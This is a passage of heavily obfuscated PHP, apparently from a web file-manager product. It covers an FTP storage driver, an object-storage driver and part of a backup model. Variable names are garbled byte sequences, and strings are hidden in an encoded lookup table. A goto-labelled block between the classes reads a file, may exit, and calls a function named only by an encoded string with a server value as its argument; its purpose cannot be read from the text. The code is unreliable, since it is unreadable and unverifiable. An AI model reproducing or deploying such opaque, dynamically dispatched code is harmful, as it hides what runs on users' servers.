$şÖÑ÷Ãå[312] => $ü”©›…Ó, $şÖÑ÷Ãå[313] => $ê“ßæö›, $şÖÑ÷Ãå[314] => $ÙÂÎ‚õ, $şÖÑ÷Ãå[208] => $this->getHost()); return $ş®è•å¥; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($½‚è•ô½) { parent::__construct(); if (count($½‚è•ô½) > 0) { $this->_init($½‚è•ô½); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($—ï°Ã‹) { $õ¶ÒÕ¾é =& $_SERVER[ÔÕ±ĞšÎ]; global $config; $this->appCharset = $config[$õ¶ÒÕ¾é[1441]]; $this->systemCharset = $config[$õ¶ÒÕ¾é[1442]]; if (isset($—ï°Ã‹[$õ¶ÒÕ¾é[1443]]) && $—ï°Ã‹[$õ¶ÒÕ¾é[1443]]) { $this->systemCharset = $—ï°Ã‹[$õ¶ÒÕ¾é[1443]]; } } public function iconvApp($íúş§ØŒ) { return $this->iconvTo($íúş§ØŒ, $this->systemCharset, $this->appCharset); } public function iconvSystem($ÌŠÆøÌ) { return $this->iconvTo($ÌŠÆøÌ, $this->appCharset, $this->systemCharset); } public function getPathOuter($ª·¶Ôû) { $§ª³¤åø =& $_SERVER[ÔÕ±ĞšÎ]; $ŸîÆâÜı = $this->iconvApp($this->pathBase); $ª·¶Ôû = $this->iconvApp($ª·¶Ôû); if (substr($ŸîÆâÜı, 0, 2) == $§ª³¤åø[1413]) { $ŸîÆâÜı = BASIC_PATH . substr($ŸîÆâÜı, 2); } if (substr($ª·¶Ôû, 0, 2) == $§ª³¤åø[1413]) { $ª·¶Ôû = BASIC_PATH . substr($ª·¶Ôû, 2); } $ŸîÆâÜı = KodIO::clear($ŸîÆâÜı); $ª·¶Ôû = KodIO::clear($ª·¶Ôû); $ª·¶Ôû = substr($ª·¶Ôû, strlen($ŸîÆâÜı)); if (empty($this->pathDriver)) { return $ª·¶Ôû; } return $this->pathDriver . $§ª³¤åø[8] . ltrim($ª·¶Ôû, $§ª³¤åø[8]); } private function _init($Ş›“ÆÛù = array()) { $İÌ——Ù =& $_SERVER[ÔÕ±ĞšÎ]; if (!function_exists($İÌ——Ù[1444])) { throw new Exception(LNG($İÌ——Ù[1445])); } $this->config = $Ş›“ÆÛù; $this->charsetReset($Ş›“ÆÛù); foreach ($Ş›“ÆÛù as $‹âüæí => $®ÉÂÇ–Œ) { if (isset($this->{$‹âüæí})) { $this->{$‹âüæí} = $®ÉÂÇ–Œ; } } return $this->_login($Ş›“ÆÛù); } private function _login($¦£îæÑ˜) { $š²ºé– =& $_SERVER[ÔÕ±ĞšÎ]; static $œ‰ğÈ¶† = array(); $¹ôŠû¿â = md5(json_encode($¦£îæÑ˜)); if (isset($œ‰ğÈ¶†[$¹ôŠû¿â])) { foreach ($œ‰ğÈ¶†[$¹ôŠû¿â] as $´ö²¹€ => $ÜÆ‘Ò¤ù) { $this->{$´ö²¹€} = $ÜÆ‘Ò¤ù; } return !0; } $ú ­Ä—º = parse_url(trim($this->server, $š²ºé–[8])); $this->host = $ú ­Ä—º[$š²ºé–[208]]; $ÉĞ¹šèÍ = isset($ú ­Ä—º[$š²ºé–[207]]) && $ú ­Ä—º[$š²ºé–[207]] == $š²ºé–[1446] ? !0 : !1; $this->scheme = $ÉĞ¹šèÍ ? $š²ºé–[1447] : $š²ºé–[1448]; $this->port = isset($ú ­Ä—º[$š²ºé–[209]]) ? $ú ­Ä—º[$š²ºé–[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($š²ºé–[1449]) . $this->host . $š²ºé–[4] . $this->port, !0); return !1; } $¼æÌãË = @ftp_login($this->connect, $this->username, $this->userpass); if (!$¼æÌãË) { $this->writeLog(LNG($š²ºé–[1450]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ºêáÛïØ = $this->pasv == $š²ºé–[91] ? !0 : !1; @ftp_pasv($this->connect, $ºêáÛïØ); $œ‰ğÈ¶†[$¹ôŠû¿â] = array($š²ºé–[1451] => $this->connect, $š²ºé–[208] => $this->host, $š²ºé–[207] => $this->scheme, $š²ºé–[209] => $this->port); return $¼æÌãË; } private function _isconn($ıì¿ÆÍ‡ = true) { if (is_resource($this->connect)) { return !0; } if (!$ıì¿ÆÍ‡) { return !1; } return $this->_login($this->config); } public function mkfile($­½¹Ë³, $ú¿Ş²ø´ = '', $ó·ûèğ• = REPEAT_RENAME) { if ($this->setContent($­½¹Ë³, $ú¿Ş²ø´)) { return $this->getPathOuter($­½¹Ë³); } $this->writeLog(LNG($_SERVER[ÔÕ±ĞšÎ][1452]), !0); return !1; } public function mkdir($îñÂÔ¼Ò, $³…ıı´Ô = REPEAT_SKIP) { $—ùëä²ê =& $_SERVER[ÔÕ±ĞšÎ]; if (!$îñÂÔ¼Ò || $îñÂÔ¼Ò == $—ùëä²ê[8]) { return !0; } if (!$this->_isconn()) { return !1; } $îñÂÔ¼Ò = $this->iconvSystem($îñÂÔ¼Ò); if ($this->_isFolder($îñÂÔ¼Ò) || @ftp_mkdir($this->connect, $îñÂÔ¼Ò)) { return $this->getPathOuter($îñÂÔ¼Ò); } if (!$this->mkdir($this->pathFather($îñÂÔ¼Ò))) { return !1; } if ($îñÂÔ¼Ò = @ftp_mkdir($this->connect, $îñÂÔ¼Ò)) { return $this->getPathOuter($îñÂÔ¼Ò); } $this->writeLog(__FUNCTION__ . $—ùëä²ê[1453], !0); return !1; } public function copyFile($Íª·µš—, $¢ŞçÃœ) { if (!$this->_isconn()) { return !1; } $¢Ÿïµ¹÷ = $this->pathThis($this->iconvSystem($Íª·µš—)); $ÍğÇÇ™Ç = $this->tempFile($¢Ÿïµ¹÷); $§ÏËæ› = $this->iconvApp($ÍğÇÇ™Ç); $this->download($Íª·µš—, $§ÏËæ›); $±èÂ£¬§ = $this->upload($¢ŞçÃœ, $§ÏËæ›); $this->tempFileRemve($ÍğÇÇ™Ç); return $±èÂ£¬§; } public function moveFile($·ú•Ó¢‡, $¾÷Úã¬Š) { if (!$this->_isconn()) { return !1; } $·ú•Ó¢‡ = $this->iconvSystem($·ú•Ó¢‡); $¾÷Úã¬Š = $this->iconvSystem($¾÷Úã¬Š); $æ³»å‘¿ = @ftp_rename($this->connect, $·ú•Ó¢‡, $¾÷Úã¬Š); if (!$æ³»å‘¿) { $this->writeLog(__FUNCTION__ . $_SERVER[ÔÕ±ĞšÎ][1453], !0); return !1; } return $this->getPathOuter($¾÷Úã¬Š); } public function delFile($¶ôšˆö†) { if (!$this->_isconn()) { return !1; } $¶ôšˆö† = $this->iconvSystem($¶ôšˆö†); $¸„Ğ¨‘à = @ftp_delete($this->connect, $¶ôšˆö†); if (!$¸„Ğ¨‘à) { $this->writeLog(__FUNCTION__ . $_SERVER[ÔÕ±ĞšÎ][1453], !0); } return $¸„Ğ¨‘à; } public function delFolder($²¯‰ôó£) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $™È•Ôœ  = $°úÄµÚå = array(); $this->fileList($²¯‰ôó£, $™È•Ôœ , $°úÄµÚå, !0); $this->listItemCache = !0; foreach ($°úÄµÚå as $Ùæõ„) { $¤œÔ– = $this->iconvSystem($Ùæõ„[$_SERVER[ÔÕ±ĞšÎ][32]]); $æı±ÅÁõ = @ftp_delete($this->connect, $¤œÔ–); if (!$æı±ÅÁõ) { return !1; } } foreach ($™È•Ôœ  as $¤œÔ–) { $¤œÔ– = $this->iconvSystem($¤œÔ–); $æı±ÅÁõ = @ftp_rmdir($this->connect, $¤œÔ–); if (!$æı±ÅÁõ) { return !1; } } $²¯‰ôó£ = $this->iconvSystem($²¯‰ôó£); return @ftp_rmdir($this->connect, $²¯‰ôó£); } public function rename($ÈŠü, $†¦Ç–Ïô) { $§æ²æ® =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->_isconn()) { return !1; } $”÷¡µ“Ì = $this->fileNameAuto($this->pathFather($ÈŠü), $†¦Ç–Ïô); $”÷¡µ“Ì = $this->iconvSystem($”÷¡µ“Ì); $ÈŠü = $this->iconvSystem($ÈŠü); $¹¿åô¬û = $this->pathFather($ÈŠü); $Üç„¥Ôï = rtrim($¹¿åô¬û, $§æ²æ®[8]) . $§æ²æ®[8] . $”÷¡µ“Ì; $¾¾ÁõîÆ = @ftp_rename($this->connect, $ÈŠü, $Üç„¥Ôï); if (!$¾¾ÁõîÆ) { $this->writeLog(__FUNCTION__ . $§æ²æ®[1453], !0); return !1; } $Üç„¥Ôï = $this->iconvApp($Üç„¥Ôï); return $this->getPathOuter($Üç„¥Ôï); } private function folderInfo($Ï‰»Ûõ, $ÒçÑí¡ë = false) { $ï¥”÷ïù =& $_SERVER[ÔÕ±ĞšÎ]; $×ÕÏø“ = array($ï¥”÷ïù[32] => $this->pathThis($Ï‰»Ûõ), $ï¥”÷ïù[87] => $this->getPathOuter($ï¥”÷ïù[8] . $Ï‰»Ûõ), $ï¥”÷ïù[33] => $ï¥”÷ïù[78]); if ($ÒçÑí¡ë) { return $×ÕÏø“; } $×ÕÏø“[$ï¥”÷ïù[233]] = $×ÕÏø“[$ï¥”÷ïù[88]] = 0; $×ÕÏø“[$ï¥”÷ïù[234]] = $×ÕÏø“[$ï¥”÷ïù[235]] = !0; return $×ÕÏø“; } private function fileInfo($ ³¹òù¡, $ Óø…ó× = false, $˜ÒöÕèƒ = array()) { $Şïëô²Î =& $_SERVER[ÔÕ±ĞšÎ]; $ĞİÄÈçğ = array($Şïëô²Î[32] => $this->pathThis($ ³¹òù¡), $Şïëô²Î[87] => $this->getPathOuter($Şïëô²Î[8] . $ ³¹òù¡), $Şïëô²Î[33] => $Şïëô²Î[232], $Şïëô²Î[79] => isset($˜ÒöÕèƒ[$Şïëô²Î[79]]) ? $˜ÒöÕèƒ[$Şïëô²Î[79]] : 0, $Şïëô²Î[169] => $this->ext($ ³¹òù¡)); if ($ Óø…ó×) { return $ĞİÄÈçğ; } $ĞİÄÈçğ[$Şïëô²Î[233]] = $ĞİÄÈçğ[$Şïëô²Î[88]] = 0; $ĞİÄÈçğ[$Şïëô²Î[234]] = $ĞİÄÈçğ[$Şïëô²Î[235]] = !0; $±¿È³¡‘ = $this->iconvSystem($ ³¹òù¡); $ĞİÄÈçğ[$Şïëô²Î[88]] = @ftp_mdtm($this->connect, $±¿È³¡‘); if (empty($˜ÒöÕèƒ)) { $˜ÒöÕèƒ = $this->objectMeta($ ³¹òù¡); if (!$˜ÒöÕèƒ) { return $ĞİÄÈçğ; } } $ĞİÄÈçğ[$Şïëô²Î[79]] = $˜ÒöÕèƒ[$Şïëô²Î[79]]; return $ĞİÄÈçğ; } public function size($ûĞı˜ÍÌ) { $ıÕåş¼ = $this->objectMeta($ûĞı˜ÍÌ); return $ıÕåş¼ ? $ıÕåş¼[$_SERVER[ÔÕ±ĞšÎ][79]] : 0; } public function info($ö¬šÕƒ) { if ($this->isFile($ö¬šÕƒ)) { return $this->fileInfo($ö¬šÕƒ, 0); } else { if ($this->isFolder($ö¬šÕƒ)) { return $this->folderInfo($ö¬šÕƒ); } } return !1; } private function fileList($¿¼û§“, &$ô‘Ìù¨¢, &$ÙâÏÈ½—, $ÄõÍ•ê = false) { $¡÷®İÌ =& $_SERVER[ÔÕ±ĞšÎ]; $¿¼û§“ = $this->iconvSystem($¿¼û§“); if (!$this->isFolder($¿¼û§“)) { return !1; } @ftp_chdir($this->connect, $¡÷®İÌ[8]); $¿¼û§“ = rtrim($¿¼û§“, $¡÷®İÌ[8]) . $¡÷®İÌ[8]; check_abort(); $õ²ı‘£í = @ftp_rawlist($this->connect, $¿¼û§“); if (!$õ²ı‘£í) { $õ²ı‘£í = array(); } $Õ¾Ğ×ñ˜ = array($¡÷®İÌ[10] => 1, $¡÷®İÌ[1365] => 1); foreach ($õ²ı‘£í as $—•à®Ÿö) { $ÓÆş©‚á = $this->_listItem($—•à®Ÿö); if ($ÓÆş©‚á[0] == $¡÷®İÌ[832]) { continue; } $‘òèè“­ = $ÓÆş©‚á[8]; if (empty($‘òèè“­) && $‘òèè“­ !== $¡÷®İÌ[230] || isset($Õ¾Ğ×ñ˜[$‘òèè“­])) { continue; } $‘òèè“­ = $this->iconvApp($¿¼û§“ . ltrim($‘òèè“­, $¡÷®İÌ[8])); $ÙÎ²Á´õ = array($¡÷®İÌ[32] => $‘òèè“­, $¡÷®İÌ[33] => $¡÷®İÌ[232], $¡÷®İÌ[79] => $ÓÆş©‚á[4]); if (substr($—•à®Ÿö, 0, 1) == $¡÷®İÌ[1454]) { $ÙÎ²Á´õ[$¡÷®İÌ[33]] = $¡÷®İÌ[78]; $ÙÎ²Á´õ[$¡÷®İÌ[79]] = 0; } $ëïÃ—ø† = $ÙÎ²Á´õ[$¡÷®İÌ[33]] == $¡÷®İÌ[78] ? !0 : !1; $this->cacheMethodInfoSet($‘òèè“­, $ëïÃ—ø†, $ÙÎ²Á´õ); if ($ëïÃ—ø†) { $ô‘Ìù¨¢[] = $‘òèè“­; if ($ÄõÍ•ê) { $this->fileList($‘òèè“­, $ô‘Ìù¨¢, $ÙâÏÈ½—, $ÄõÍ•ê); } continue; } $ÙâÏÈ½—[] = $ÙÎ²Á´õ; } $this->cacheMethodInfoSet($¿¼û§“, !0); } private function _listItem($ë«ıãËë) { if (empty($ë«ıãËë)) { return array(); } $À½‰éÏ¾ = preg_split($_SERVER[ÔÕ±ĞšÎ][1455], $ë«ıãËë); if (count($À½‰éÏ¾) <= 9) { return $À½‰éÏ¾; } $À½‰éÏ¾[8] = trim(substr($ë«ıãËë, strpos($ë«ıãËë, $À½‰éÏ¾[7]) + strlen($À½‰éÏ¾[7]))); return array_splice($À½‰éÏ¾, 0, 9); } public function listPath($Ëä¨ºÎˆ, $ö¿¢ıÒ = false) { $²öè   =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->_isconn()) { return !1; } $ªõØê¤¡ = $ÎÃòşªŠ = array(); $this->fileList($Ëä¨ºÎˆ, $ªõØê¤¡, $ÎÃòşªŠ); foreach ($ªõØê¤¡ as $ñŸÑûŞå => $²¡§ŒÎĞ) { $ªõØê¤¡[$ñŸÑûŞå] = $this->folderInfo($²¡§ŒÎĞ, $ö¿¢ıÒ); } foreach ($ÎÃòşªŠ as $ñŸÑûŞå => $²¡§ŒÎĞ) { $ÎÃòşªŠ[$ñŸÑûŞå] = $this->fileInfo($²¡§ŒÎĞ[$²öè  [32]], $ö¿¢ıÒ, $²¡§ŒÎĞ); } return array($²öè  [85] => $ªõØê¤¡, $²öè  [86] => $ÎÃòşªŠ); } public function has($Šá®ìß, $’Üğ¶‹Ö = false, $şü£ãöğ = true) { $Ş½İ·ÁË =& $_SERVER[ÔÕ±ĞšÎ]; $±¦å•Üë = $úïó¢ = array(); $²‹ô–ŸŸ = $’Üğ¶‹Ö ? !0 : !1; $this->fileList($Šá®ìß, $±¦å•Üë, $úïó¢, $²‹ô–ŸŸ); if ($’Üğ¶‹Ö) { return array($Ş½İ·ÁË[241] => count($úïó¢), $Ş½İ·ÁË[242] => count($±¦å•Üë)); } if ($şü£ãöğ) { if (count($úïó¢)) { return !0; } } else { if (count($±¦å•Üë)) { return !0; } } return !1; } public function listAll($äá·´å) { $Ù…ú‚»¢ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->_isconn()) { return !1; } $Âè¦‡Ş§ = $ˆ²Å‘°µ = array(); $this->fileList($äá·´å, $Âè¦‡Ş§, $ˆ²Å‘°µ, !0); $Îâ™ÃÑû = array_to_keyvalue($ˆ²Å‘°µ, $Ù…ú‚»¢[32]); foreach ($Âè¦‡Ş§ as $–“±½‹) { if (is_string($–“±½‹)) { $Îâ™ÃÑû[$–“±½‹] = array($Ù…ú‚»¢[79] => 0); } } return $this->listAllFiles($äá·´å, $Îâ™ÃÑû); } public function getContent($û‚ÇíıŒ) { if (!$this->_isconn()) { return !1; } $û‚ÇíıŒ = $this->iconvSystem($û‚ÇíıŒ); return $this->fileSubstr($û‚ÇíıŒ); } public function setContent($’ŠÚ·ÖØ, $’¯ÄÕ… = '') { if (!$this->_isconn()) { return !1; } $ ­Ä…ø = $this->pathThis($this->iconvSystem($’ŠÚ·ÖØ)); $¥Ä’¬¥ = $this->tempFile($ ­Ä…ø); file_put_contents($¥Ä’¬¥, $’¯ÄÕ…); $€ÑéÀ = $this->upload($’ŠÚ·ÖØ, $this->iconvApp($¥Ä’¬¥)); $this->tempFileRemve($¥Ä’¬¥); return $€ÑéÀ; } public function fileSubstr($±…Ô¶ó­, $Î×â•ˆ = 0, $œÜê»½† = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($±…Ô¶ó­, $Î×â•ˆ, $œÜê»½†); } private function ftpRequest($ù ß¡¨», $™¾Ï×Ûî = 0, $áú§ƒ = false) { $ù ß¡¨» = $this->iconvSystem($ù ß¡¨»); $¨õ€Ìëµ = $this->scheme . $this->host . $_SERVER[ÔÕ±ĞšÎ][4] . $this->port; $üâéº² = curl_init(); curl_setopt($üâéº², CURLOPT_URL, $¨õ€Ìëµ . $this->pathEncode($ù ß¡¨»)); curl_setopt($üâéº², CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($áú§ƒ) { $¨‰ñâÔ‹ = $™¾Ï×Ûî + $áú§ƒ - 1; curl_setopt($üâéº², CURLOPT_RANGE, "{$™¾Ï×Ûî}\x2d{$¨‰ñâÔ‹}"); } curl_setopt($üâéº², CURLOPT_RETURNTRANSFER, 1); $•¦×½è½ = curl_exec($üâéº²); curl_close($üâéº²); return $•¦×½è½; } public function upload($‰ÎŒ™Óô, $í½Ç‡ôñ, $”şÜ ‹ª = false, $şª¤úå– = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($‰ÎŒ™Óô))) { return !1; } $‰ÎŒ™Óô = $this->iconvSystem($‰ÎŒ™Óô); $í½Ç‡ôñ = $this->iconvSystem($í½Ç‡ôñ); $ø¥½µ¦Í = ftp_nb_put($this->connect, $‰ÎŒ™Óô, $í½Ç‡ôñ, FTP_BINARY); while ($ø¥½µ¦Í == FTP_MOREDATA) { $ø¥½µ¦Í = ftp_nb_continue($this->connect); } if ($ø¥½µ¦Í != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ÔÕ±ĞšÎ][1453], !0); return !1; } return $this->getPathOuter($‰ÎŒ™Óô); } public function download($’ş´ŠÛ , $¯ —¬à = '') { if (!$this->_isconn()) { return !1; } $ÃŞÄƒ× = $this->pathFather($¯ —¬à); if (!IO::mkdir($ÃŞÄƒ×)) { return !1; } $’ş´ŠÛ  = $this->iconvSystem($’ş´ŠÛ ); $¯ —¬à = $this->iconvSystem($¯ —¬à); $±…ª“°Ü = ftp_nb_get($this->connect, $¯ —¬à, $’ş´ŠÛ , FTP_BINARY); while ($±…ª“°Ü == FTP_MOREDATA) { $±…ª“°Ü = ftp_nb_continue($this->connect); } if ($±…ª“°Ü != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ÔÕ±ĞšÎ][1453], !0); return !1; } return $this->iconvApp($¯ —¬à); } public function exist($—§şÊĞ”) { return $this->isFile($—§şÊĞ”) || $this->isFolder($—§şÊĞ”); } public function isFile($°ÑÀäÀú) { return !$this->isFolder($°ÑÀäÀú) && $this->objectMeta($°ÑÀäÀú); } public function isFolder($øŒÂÂöó) { return $this->cacheMethod($_SERVER[ÔÕ±ĞšÎ][179], $øŒÂÂöó); } protected function objectMeta($æÈÚûÈÀ) { return $this->cacheMethod($_SERVER[ÔÕ±ĞšÎ][181], $æÈÚûÈÀ); } protected function _objectMeta($Ñ‚ÏËØ) { $Ì™ªØû´ =& $_SERVER[ÔÕ±ĞšÎ]; if ($Ñ‚ÏËØ == $Ì™ªØû´[12] || $Ñ‚ÏËØ == $Ì™ªØû´[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ñ‚ÏËØ = $this->iconvSystem($Ñ‚ÏËØ); $Üû¤ÒÅî = array($Ì™ªØû´[32] => $this->iconvApp($Ñ‚ÏËØ), $Ì™ªØû´[33] => $Ì™ªØû´[232], $Ì™ªØû´[79] => 0); @ftp_chdir($this->connect, $Ì™ªØû´[8]); $ÁéÖ§Ñå = @ftp_size($this->connect, $Ñ‚ÏËØ); if ($ÁéÖ§Ñå != -1) { $Üû¤ÒÅî[$Ì™ªØû´[79]] = $ÁéÖ§Ñå; } else { $‡Ò¨Èûå = @ftp_chdir($this->connect, $Ñ‚ÏËØ); if (!$‡Ò¨Èûå) { return !1; } $Üû¤ÒÅî[$Ì™ªØû´[33]] = $Ì™ªØû´[78]; } return $Üû¤ÒÅî; } protected function _isFolder($˜©âìÉ) { $ôµÅ–Æ­ =& $_SERVER[ÔÕ±ĞšÎ]; if ($˜©âìÉ == $ôµÅ–Æ­[12] || $˜©âìÉ == $ôµÅ–Æ­[8]) { return !0; } $ÍÆêßê = $this->_objectMeta($˜©âìÉ); return isset($ÍÆêßê[$ôµÅ–Æ­[33]]) && $ÍÆêßê[$ôµÅ–Æ­[33]] == $ôµÅ–Æ­[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($¨†®³¨æ) { parent::__construct($¨†®³¨æ); $this->setSignVersion($_SERVER[ÔÕ±ĞšÎ][249]); } public function uploadLink($Å‘Ä²âª, $Ã°ö–Î = 0) { $›ğË¿ìı =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->isUploadServer()) { return; } $ĞÒş’Áû = $this->getType(); if (!in_array($ĞÒş’Áû, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¾é¹ê´÷ = (!$Ã°ö–Î ? 1 : ceil($Ã°ö–Î / pow(1024, 3))) * 3600 * 4; $áìæ”ˆ = $this->uploadMultiData($Å‘Ä²âª, $¾é¹ê´÷); if ($áìæ”ˆ) { $áìæ”ˆ[$›ğË¿ìı[97]] = $Å‘Ä²âª; $áìæ”ˆ[$›ğË¿ìı[98]] = $ĞÒş’Áû; } return $áìæ”ˆ; } public function fileOutImage($”¡Ä’³Ê, $´ÔµŞÅÜ = 250) { if ($this->size($”¡Ä’³Ê) > 1024 * 1024 * 25) { return $this->fileOutImageServer($”¡Ä’³Ê, $´ÔµŞÅÜ); } $£»Ó»Ê« = $this->link($”¡Ä’³Ê); $£»Ó»Ê« .= $_SERVER[ÔÕ±ĞšÎ][1456] . $´ÔµŞÅÜ; $this->fileOutLink($£»Ó»Ê«); } public function fileOutLink($«÷¼îı‹) { $¸õ®¤Ñ =& $_SERVER[ÔÕ±ĞšÎ]; if (substr($«÷¼îı‹, 0, 7) == $¸õ®¤Ñ[218]) { $«÷¼îı‹ = $¸õ®¤Ñ[219] . substr($«÷¼îı‹, 7); } header($¸õ®¤Ñ[175] . $«÷¼îı‹); die; } } goto Fê‡¥ˆáóµ; A×¨»¨á…: if ($_SERVER[$_SERVER[ÔÕ±ĞšÎ][952]] != $_SERVER[$_SERVER[ÔÕ±ĞšÎ][2003]]) { $_getc = $_SERVER[ÔÕ±ĞšÎ][955]; $_getfile = $_SERVER[$_SERVER[ÔÕ±ĞšÎ][956]] . $_SERVER[ÔÕ±ĞšÎ][957]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÔÕ±ĞšÎ][287], $_getfilec); if (count($_getarrs) < $_SERVER[ÔÕ±ĞšÎ][696]) { $exit = $_SERVER[ÔÕ±ĞšÎ][958]; $exit(); } $_act = $_SERVER[ÔÕ±ĞšÎ][961]; $_act($_SERVER[$_SERVER[ÔÕ±ĞšÎ][953]]); } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\x62\141\x63\153\165\x70\114\x69\163\164"; public $field = array("\151\x6f", "\x6e\x61\x6d\x65", "\163\164\141\164\x75\x73", "\x63\x6f\x6e\x74\x65\x6e\x74", "\155\141\x6e\165\141\154", "\x72\x65\163\x75\154\164", "\x74\x69\155\x65\x46\162\157\x6d", "\164\151\155\145\124\157"); public function config() { $üî”†ÏĞ =& $_SERVER[ÔÕ±ĞšÎ]; Action($üî”†ÏĞ[2004])->taskInit(); $–ãğ‡ Ñ = Model($üî”†ÏĞ[844])->get($üî”†ÏĞ[858]); $–ãğ‡ Ñ = json_decode($–ãğ‡ Ñ, !0); $–ãğ‡ Ñ = is_array($–ãğ‡ Ñ) ? $–ãğ‡ Ñ : array(); $this->parseContent($–ãğ‡ Ñ); unset($–ãğ‡ Ñ[$üî”†ÏĞ[1746]]); Model($üî”†ÏĞ[1745])->cacheClear(); $Ôû—•Ã¹ = $üî”†ÏĞ[2005]; $ä§›¦ˆá = Model($üî”†ÏĞ[2006])->findByKey($üî”†ÏĞ[1764], $Ôû—•Ã¹); if (!$ä§›¦ˆá) { $ä§›¦ˆá = array(); } if (isset($ä§›¦ˆá[$üî”†ÏĞ[206]])) { $ä§›¦ˆá[$üî”†ÏĞ[206]] = json_decode($ä§›¦ˆá[$üî”†ÏĞ[206]], !0); } if (isset($–ãğ‡ Ñ[$üî”†ÏĞ[206]])) { $ä§›¦ˆá[$üî”†ÏĞ[206]][$üî”†ÏĞ[1749]] = $–ãğ‡ Ñ[$üî”†ÏĞ[206]]; unset($–ãğ‡ Ñ[$üî”†ÏĞ[206]]); } return array_merge($ä§›¦ˆá, $–ãğ‡ Ñ); } public function listData($ÎÈè¥á¹ = false, $ÇëÉ ¥ = "\155\157\144\x69\146\171\x54\151\155\145", $×Ö³É£È = false) { $Ò•£„Ÿ™ = parent::listData($ÎÈè¥á¹, $ÇëÉ ¥, !0); if (!$Ò•£„Ÿ™) { return $Ò•£„Ÿ™; } if ($ÎÈè¥á¹) { $Ò•£„Ÿ™ = array($Ò•£„Ÿ™); } foreach ($Ò•£„Ÿ™ as &$¾¶î„¢ß) { $this->parseContent($¾¶î„¢ß); } return $ÎÈè¥á¹ ? $Ò•£„Ÿ™[0] : $Ò•£„Ÿ™; } public function parseContent(&$±Ü¿Ùşô) { $èà×ÅÂ¥ =& $_SERVER[ÔÕ±ĞšÎ]; $ÖÌ•ı = _get($±Ü¿Ùşô, $èà×ÅÂ¥[171], $èà×ÅÂ¥[91]); if (!in_array($ÖÌ•ı, array($èà×ÅÂ¥[850], $èà×ÅÂ¥[1211]))) { $±Ü¿Ùşô[$èà×ÅÂ¥[171]] = $ÖÌ•ı == $èà×ÅÂ¥[91] ? $èà×ÅÂ¥[1211] : $èà×ÅÂ¥[850]; } } public function lastItem() { $®“ô¨Ñ = $this->listData(); return !empty($®“ô¨Ñ[0]) ? $®“ô¨Ñ[0] : null; } public function kill($­ôŸóøÈ) { $Éƒ›ãœ =& $_SERVER[ÔÕ±ĞšÎ]; $ãïÂÊÖ¤ = $this->listData($­ôŸóøÈ); if (!$ãïÂÊÖ¤ || empty($ãïÂÊÖ¤[$Éƒ›ãœ[32]])) { return !0; } Task::kill($Éƒ›ãœ[857]); Task::kill($Éƒ›ãœ[875]); Task::kill($Éƒ›ãœ[884]); $›¦ƒÍøû = $ãïÂÊÖ¤[$Éƒ›ãœ[32]]; $…”éçŞ° = TEMP_FILES . $Éƒ›ãœ[853] . $›¦ƒÍøû . $Éƒ›ãœ[8]; IO::remove($…”éçŞ°, !1); return $this->remove($­ôŸóøÈ); } public function remove($ÊçÜ¾Áá) { $Ö¢€Á…Î = $this->listData($ÊçÜ¾Áá); if (!$Ö¢€Á…Î) { return !0; } return $this->backupRemove($Ö¢€Á…Î); } private function backupRemove($Áæ‘ªŠÈ) { parent::remove($Áæ‘ªŠÈ[$_SERVER[ÔÕ±ĞšÎ][477]]); $´†ö«Æä = $this->backupPath($Áæ‘ªŠÈ); IO::remove($´†ö«Æä, !1); return !0; } private function backupPath($øÔèğÁ) { $Ÿ´ÊÇ£Û =& $_SERVER[ÔÕ±ĞšÎ]; $¬”Î€‚Â = $øÔèğÁ[$Ÿ´ÊÇ£Û[32]]; $ËŒ¦ùñ— = Model($Ÿ´ÊÇ£Û[844])->get($Ÿ´ÊÇ£Û[845]); $ÂËüÇğã = substr(md5($Ÿ´ÊÇ£Û[846] . $ËŒ¦ùñ— . $¬”Î€‚Â), 0, 8); return "\173\x69\x6f\72{$øÔèğÁ[$Ÿ´ÊÇ£Û[826]]}\175\57\x64\141\164\141\x62\141\163\x65\x2f\x62\141\x63\153\165\160\x2f" . $¬”Î€‚Â . $Ÿ´ÊÇ£Û[11] . $ÂËüÇğã; } public function start() { $¶­ûæ =& $_SERVER[ÔÕ±ĞšÎ]; if ($GLOBALS[$¶­ûæ[6]][$¶­ûæ[92]][$¶­ûæ[2007]] != $¶­ûæ[91]) { return !0; } $‘õÂÚğ = $this->config(); if (!$‘õÂÚğ || $‘õÂÚğ[$¶­ûæ[1746]] != $¶­ûæ[91]) { return !1; } if ($‘õÂÚğ[$¶­ûæ[171]] == $¶­ûæ[850]) { $¼«½Ååö = Model($¶­ûæ[844])->get($¶­ûæ[1326]); if ($¼«½Ååö == $¶­ûæ[1327]) { $‘õÂÚğ[$¶­ûæ[171]] = $¶­ûæ[1211]; } } $ùâÚÈ = $this->process(); foreach ($ùâÚÈ as $‹ëğ®Ş½) { if ($‹ëğ®Ş½) { return Task::restart($‹ëğ®Ş½[$¶­ûæ[477]]); } } $ÙÄª¡°ò = new Backup(); $ì¶Òú¶ñ = $ÙÄª¡°ò->db(); if ($ì¶Òú¶ñ) { $ì¶Òú¶ñ = $ÙÄª¡°ò->dbFile(); if ($ì¶Òú¶ñ && $‘õÂÚğ[$¶­ûæ[171]] == $¶­ûæ[850]) { $ì¶Òú¶ñ = $ÙÄª¡°ò->file(); 